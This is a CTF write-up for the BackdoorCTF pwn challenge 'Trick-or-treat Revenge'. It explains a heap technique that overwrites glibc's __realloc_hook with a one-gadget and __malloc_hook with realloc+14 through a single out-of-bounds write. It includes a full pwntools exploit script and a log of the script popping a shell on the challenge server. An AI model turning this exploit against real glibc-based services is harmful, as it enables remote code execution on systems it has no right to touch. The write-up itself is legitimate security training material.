I"ã0<p>I played this CTF with 0x1 and got 9th place.</p>

<p>This was almost the exact same challenge as HITCON CTF 2019 Qualiferâ€™s Trick or Treat. Only 5 people solved it including me. I am not sure why..</p>

<h3 id="challenge">Challenge</h3>

<p><strong>Points</strong>: 405</p>

<blockquote>
  <p>Trick-or-treat Revenge.</p>

  <p><a href="http://backdoor.static.beast.sdslabs.co/static/trick-repeat/miscpwn">http://backdoor.static.beast.sdslabs.co/static/trick-repeat/miscpwn</a></p>

  <p><a href="http://backdoor.static.beast.sdslabs.co/static/trick-repeat/libc.so.6">http://backdoor.static.beast.sdslabs.co/static/trick-repeat/libc.so.6</a></p>

  <p><code class="highlighter-rouge">nc 51.158.118.84 17004</code></p>

  <p>Flag format: CTF{â€¦}</p>

  <p>Created by: <a href="https://backdoor.sdslabs.co/users/fs0ciety">Nipun Gupta</a></p>

  <p>No. of Correct Submissions: 5</p>
</blockquote>

<h3 id="solution">Solution</h3>

<p>I wonâ€™t go into much detail about this challenge since you can just read my writeup for Trick or Treat <a href="/2019-10-14-hitconctf-2019-trick-or-treat/">here</a>.</p>

<p>The idea with this one is that you can malloc a chunk of size 10000000 and get the chunk mmapped and aligned to libc, but you are only allowed to perform one out of bounds relative write. After the write, there is a call to <code class="highlighter-rouge">malloc(0xa)</code> followed by <code class="highlighter-rouge">exit(0)</code>. Therefore, we have no choice but to overwrite <code class="highlighter-rouge">__malloc_hook</code>, however none of the normal one gadgets worked.</p>

<p>The way I went about it was to realize that right before <code class="highlighter-rouge">__malloc_hook</code> is <code class="highlighter-rouge">__realloc_hook</code>. The binary lets us write 0x10 bytes, so I solved it by first overwriting <code class="highlighter-rouge">__realloc_hook</code> to a working one gadget, and then overwrote <code class="highlighter-rouge">__malloc_hook</code> to <code class="highlighter-rouge">realloc+14</code>. This made it so that the constraints for one of the gadgets was suddenly met.</p>

<p>My exploit script is shown below:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./miscpwn'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>

<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'51.158.118.84'</span><span class="p">,</span> <span class="mi">17004</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
	<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
		<span class="k">print</span> <span class="s">"LOCAL PROCESS"</span>
		<span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="s">'./miscpwn'</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">print</span> <span class="s">"REMOTE PROCESS"</span>
		<span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_base_address</span><span class="p">(</span><span class="n">proc</span><span class="p">):</span>
	<span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">"/proc/{}/maps"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pid</span><span class="p">),</span> <span class="s">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-'</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
    <span class="n">script</span> <span class="o">=</span> <span class="s">"handle SIGALRM ignore</span><span class="se">\n</span><span class="s">"</span>
    <span class="n">PIE</span> <span class="o">=</span> <span class="n">get_base_address</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    <span class="n">script</span> <span class="o">+=</span> <span class="s">"set $_base = 0x{:x}</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">PIE</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="s">"b *0x</span><span class="si">%</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">PIE</span><span class="o">+</span><span class="n">bp</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>

<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
	<span class="n">debug</span><span class="p">([</span><span class="mh">0x13b9</span><span class="p">])</span>

<span class="c1"># Malloc a chunk such that it gets mmapped aligned to Libc
</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'10000000'</span><span class="p">)</span>

<span class="c1"># Remote binary behaves differently idek
</span><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
	<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="c1"># Calculate addresses required
</span><span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">+</span> <span class="mh">0x989ff0</span>
<span class="n">realloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'__realloc_hook'</span><span class="p">]</span>
<span class="n">hook_offset</span> <span class="o">=</span> <span class="n">realloc_hook</span> <span class="o">-</span> <span class="n">leak</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Chunk: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'__realloc_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">realloc_hook</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Offset: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">hook_offset</span><span class="p">))</span>

<span class="c1"># Set the offset correctly so we reach __realloc_hook
</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">hook_offset</span><span class="p">))</span>

<span class="c1"># Overwrite __realloc_hook with one gadget, overwrite __malloc_hook with realloc+14
</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x501e3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'realloc'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">14</span><span class="p">))</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu1810:/ctf/practice/backdoorctf/miscpwn<span class="nv">$ </span>./exploit.py REMOTE
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/practice/backdoorctf/miscpwn/miscpwn'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/practice/backdoorctf/miscpwn/libc.so.6'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
REMOTE PROCESS
<span class="o">[</span>+] Opening connection to 51.158.118.84 on port 17004: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Chunk: 0x7f47cefef010
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc base: 0x7f47cf979000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> __realloc_hook: 0x7f47cfb5dc28
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Offset: 0xb6ec18
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode

<span class="nv">$ </span><span class="nb">ls
</span>Dockerfile
beast.toml
flag.txt
ld-2.28.so
libc.so.6
miscpwn
miscpwn.c
post-build.sh
public
setup.sh
<span class="nv">$ </span><span class="nb">cat </span>flag.txt
CTF<span class="o">{</span>REDACTEDREDACTEDREDACTED<span class="o">}</span>
<span class="nv">$ </span> 
</code></pre></div></div>
:ET